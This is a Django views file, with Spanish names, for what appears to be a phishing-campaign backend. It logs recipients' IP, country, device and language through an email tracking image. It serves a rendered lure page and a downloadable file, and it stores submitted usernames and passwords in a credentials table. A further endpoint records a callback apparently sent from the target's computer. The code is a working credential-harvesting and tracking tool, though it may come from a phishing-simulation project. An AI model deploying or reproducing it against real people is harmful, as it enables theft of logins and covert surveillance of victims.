from django.shortcuts import render, redirect
from datetime import datetime
import geoip2.database
from user_agents import parse
from django.views.decorators.csrf import csrf_exempt
from django.http import FileResponse, Http404, JsonResponse, HttpResponse
from django.template import Context, Template
from backend.registradores.models import Estatus_Mail, Estatus_PC, Estatus_Web, Credenciales
from backend.plantillas.models import Plantillas
from backend.smtp.models import Enviados



def mail_status(request, int=None, imagen=None):

    enviado = Enviados.objects.get(id=int)
    data = registrar(request)

    Estatus_Mail.objects.filter(enviado=enviado).update(
        ip=data["ip"],
        agente=data["agente"],
        pais=data["pais"],
        metodo=request.method,
        parametros=request.GET.dict(),
        sistema_operativo=data["sistema_operativo"],
        dispositivo=data["dispositivo"],
        idioma=data["idioma"],
        fecha=data["fecha"]
    )


    try:
        plantilla_id = enviado.plantilla.id
        image = Plantillas.objects.get(id=plantilla_id).imagen

    except (Estatus_Mail.DoesNotExist, Plantillas.DoesNotExist):
        raise Http404("No se encontró la imagen")


    return FileResponse(open(image.path, 'rb'))


@csrf_exempt
def web_estatus(request, int=None):

    enviado = Enviados.objects.get(id=int)
    data = registrar(request)

    Estatus_Web.objects.filter(enviado=enviado).update(
        ip=data["ip"],
        agente=data["agente"],
        pais=data["pais"],
        metodo=request.method,
        parametros=request.GET.dict(),
        sistema_operativo=data["sistema_operativo"],
        dispositivo=data["dispositivo"],
        idioma=data["idioma"],
        fecha=data["fecha"]
    )


    if request.method == 'POST' and request.POST.get('descarga'):
        plantilla_id = request.POST['plantilla_id']
        archivo = Plantillas.objects.get(id=plantilla_id).archivo
        file_path = archivo.path
        return FileResponse(open(file_path, 'rb'))
    
    elif request.method == 'POST' and request.POST.get('credenciales'):
        estatus_web = Estatus_Web.objects.get(enviado=enviado)
        Credenciales.objects.create(estatus_web=estatus_web, usuario=request.POST.get('usuario'), contraseña=request.POST.get('contraseña'))

    plantilla_id = Enviados.objects.get(id=int).plantilla.id
    usuario = Enviados.objects.get(id=int).correo
    html_content = Plantillas.objects.get(id=plantilla_id).plantilla
    template = Template(html_content)
    context = Context({

        'id': enviado.id,
        'usuario':usuario

    })
    rendered_html = template.render(context)

    return HttpResponse(rendered_html)





@csrf_exempt
def pc_estatus(request, int=None):

    if request.method == 'POST':

        enviado = Enviados.objects.get(id=int)
        data = registrar(request)

        Estatus_PC.objects.filter(enviado=enviado).update(
            ip=data["ip"],
            agente=data["agente"],
            pais=data["pais"],
            metodo=request.method,
            parametros=request.GET.dict(),
            sistema_operativo=data["sistema_operativo"],
            dispositivo=data["dispositivo"],
            idioma=data["idioma"],
            fecha=data["fecha"]
        )


        return JsonResponse({'Estatus':'ok'}, safe=False)
    else:
        return JsonResponse({'Estatus':'bad request'}, safe=False)
    



def registrar(request):

    ip = request.META.get('REMOTE_ADDR')
    agente = request.META.get('HTTP_USER_AGENT')
    geoip_reader = geoip2.database.Reader('./GeoLite2-City.mmdb')
    try:
        response = geoip_reader.city(ip)
        pais = response.country.name
    except geoip2.errors.AddressNotFoundError:
        pais = 'Desconocido'

    fecha = datetime.now()

    agente_parsed = parse(agente)
    sistema_operativo = agente_parsed.os.family
    dispositivo = agente_parsed.device.family
    try:
        idioma = request.META.get('HTTP_ACCEPT_LANGUAGE'),
    except:
        idioma = "null"

    data = {

        "ip" : ip,
        "agente" : agente,
        "pais" : pais,
        "sistema_operativo" : sistema_operativo,
        "dispositivo" : dispositivo,
        "idioma" : idioma,
        "fecha" : fecha
    }

    geoip_reader.close()

    return data